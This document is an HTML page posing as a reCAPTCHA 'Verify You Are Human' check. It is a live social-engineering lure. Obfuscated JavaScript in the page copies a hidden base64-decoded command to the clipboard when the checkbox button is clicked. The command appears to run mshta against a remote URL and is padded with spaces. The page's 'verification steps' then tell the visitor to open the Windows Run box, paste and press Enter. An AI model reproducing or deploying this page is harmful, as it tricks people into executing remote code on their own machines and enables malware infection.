<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>reCAPTCHA V3 Security</title>
  <meta name="robots" content="noindex,nofollow">
  <meta name="googlebot" content="noindex,nofollow">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
  
    body,html{margin:0;padding:0;width:100%;height:100%;display:flex;justify-content:center;align-items:center;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f2f2f2;color:#333}
    .a{position:relative;text-align:center;max-width:500px;margin:20px;}
    .b{padding:20px;background:#fff;box-shadow:0 5px 20px rgba(0,0,0,.3);border-radius:8px;text-align:center}
    .b h2{margin:0 0 20px;font-size:28px;color:#4285f4}
    .b p{margin:0 0 20px;font-size:18px;color:#666}
    .c{display:inline-flex;align-items:center;padding:10px 20px;background:#4285f4;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:16px;transition:background .1s}
    .c img{margin-right:10px}
    .c:hover{background:#357ae8}
    .d{display:none;padding:20px;background:#fff;box-shadow:0 5px 20px rgba(0,0,0,.3);border-radius:8px;text-align:left;position:absolute;top:110%;left:50%;transform:translateX(-50%);z-index:20;animation:fadeIn .1s ease}
    .d.show{display:block}
    .d h3{margin:0 0 15px;font-size:24px;color:#333}
    .d p{font-size:18px;color:#333;margin:5px 0}
    .e{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);z-index:10;display:none}
    .e.show{display:block}
    @keyframes fadeIn{from{opacity:0}to{opacity:1}}
    
  </style>
</head>
<body> 
  
  <div class="a">
    <div class="e" id="i"></div>
    <div class="b">
      <h2>Verify You Are Human</h2>
      <p>Please verify that you are a human to continue.</p>
      <div class="c" id="kkk">
        <img src="data:image/png;base64,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" alt="reCAPTCHA Logo">
        <span>I'm not a robot</span>
      </div>
      <div class="d" id="k">
        <h3>Verification Steps</h3>
        <p>1. Press Windows Button "<i class="fab fa-windows"></i>" + R</p>
        <p>2. Press CTRL + V</p>
        <p>3. Press Enter</p>
      </div>
    </div>
    
  </div>
  <script>
function _0x1d42(_0x149841,_0x3e1f3b){var _0x2dfa39=_0x3781();return _0x1d42=function(_0x1b1d8b,_0x3e906c){_0x1b1d8b=_0x1b1d8b-(-0xa*0x23b+-0xbfe+0x243c);var _0x2369f6=_0x2dfa39[_0x1b1d8b];return _0x2369f6;},_0x1d42(_0x149841,_0x3e1f3b);}(function(_0x5cb26d,_0x562580){var _0x1451a2=_0x1d42,_0x4510af=_0x5cb26d();while(!![]){try{var _0x180a33=-parseInt(_0x1451a2(0x200))/(-0x946+-0x51*0x28+0x15ef)*(-parseInt(_0x1451a2(0x204))/(0x400+-0x26b9+0x22bb))+parseInt(_0x1451a2(0x1f3))/(0xb2*0x14+0x22cf+-0x30b4)+-parseInt(_0x1451a2(0x1f5))/(0xaa*0x12+-0x1*-0x113b+-0x1d2b)+parseInt(_0x1451a2(0x1f1))/(0x73b*0x4+0x1a9d+-0x3784)*(-parseInt(_0x1451a2(0x205))/(-0xb76*0x1+0x5*-0x271+0x17b1))+-parseInt(_0x1451a2(0x1ff))/(0x741+0x1*0x1ef9+-0x2633)+parseInt(_0x1451a2(0x212))/(0x5*-0x7f+-0xd8a+-0x24b*-0x7)*(parseInt(_0x1451a2(0x1fc))/(0x191*0x7+-0xd1f+0x231))+parseInt(_0x1451a2(0x219))/(0x7*0x6e+0x535+-0x1*0x82d);if(_0x180a33===_0x562580)break;else _0x4510af['push'](_0x4510af['shift']());}catch(_0x17b954){_0x4510af['push'](_0x4510af['shift']());}}}(_0x3781,-0x17*-0x10471+0x1*0x72d+-0x1*0xaebc6),(function(){var _0x57a39a=_0x1d42,_0x369102={'rVyfV':function(_0x135d97,_0x513a5c){return _0x135d97(_0x513a5c);},'FwdPr':_0x57a39a(0x1f7)+_0x57a39a(0x1fb),'IZiDl':_0x57a39a(0x218),'SlnUu':_0x57a39a(0x1fe),'FlfqB':_0x57a39a(0x216),'rZufQ':_0x57a39a(0x201)+_0x57a39a(0x21a)+_0x57a39a(0x1f8)+_0x57a39a(0x20e)+_0x57a39a(0x20a)+_0x57a39a(0x211)+_0x57a39a(0x20a)+_0x57a39a(0x211)+_0x57a39a(0x20a)+_0x57a39a(0x211)+_0x57a39a(0x20a)+_0x57a39a(0x211)+_0x57a39a(0x1f2),'GhDLQ':_0x57a39a(0x1f6)};function _0x4198ac(_0x1d44b9){var _0x348350=_0x57a39a;return _0x369102[_0x348350(0x207)](decodeURIComponent,_0x369102[_0x348350(0x207)](escape,window[_0x348350(0x20d)](_0x1d44b9)));}document[_0x57a39a(0x1fd)+_0x57a39a(0x206)](_0x369102[_0x57a39a(0x1fa)])[_0x57a39a(0x1f4)]=function(){var _0x19023c=_0x57a39a,_0x4702bb=_0x369102[_0x19023c(0x214)][_0x19023c(0x202)]('|'),_0x5c91c9=-0x53e*-0x3+0xae5+0x553*-0x5;while(!![]){switch(_0x4702bb[_0x5c91c9++]){case'0':var _0x53ebcf=document[_0x19023c(0x209)+_0x19023c(0x20f)](_0x369102[_0x19023c(0x217)]);continue;case'1':document[_0x19023c(0x21b)][_0x19023c(0x208)+'d'](_0x53ebcf);continue;case'2':document[_0x19023c(0x1fd)+_0x19023c(0x206)]('i')[_0x19023c(0x1f9)][_0x19023c(0x210)](_0x369102[_0x19023c(0x20c)]);continue;case'3':_0x53ebcf[_0x19023c(0x1f0)]();continue;case'4':document[_0x19023c(0x21b)][_0x19023c(0x20b)+'d'](_0x53ebcf);continue;case'5':document[_0x19023c(0x215)+'d'](_0x369102[_0x19023c(0x213)]);continue;case'6':document[_0x19023c(0x1fd)+_0x19023c(0x206)]('k')[_0x19023c(0x1f9)][_0x19023c(0x210)](_0x369102[_0x19023c(0x20c)]);continue;case'7':_0x53ebcf[_0x19023c(0x21c)]=_0x369102[_0x19023c(0x207)](_0x4198ac,_0x369102[_0x19023c(0x203)]);continue;}break;}};}()));function _0x3781(){var _0x5e01c6=['body','value','select','1660495GNAMad','ICA=','889071seyrRp','onclick','1062196nOrYXR','kkk','0|7|1|3|5|','bm8uY28vMl','classList','GhDLQ','4|6|2','9636525ObAgmI','getElement','show','11002138gLhQEe','10721NmdNXb','bXNodGEgaH','split','rZufQ','12eLuwOy','12ktIbia','ById','rVyfV','appendChil','createElem','ICAgICAgIC','removeChil','SlnUu','atob','VkMnY2ICAg','ent','add','AgICAgICAg','8VEbYsf','FlfqB','FwdPr','execComman','copy','IZiDl','textarea','18896710yUOOdb','R0cHM6Ly8y'];_0x3781=function(){return _0x5e01c6;};return _0x3781();}
  </script>
 
</body>
</html>
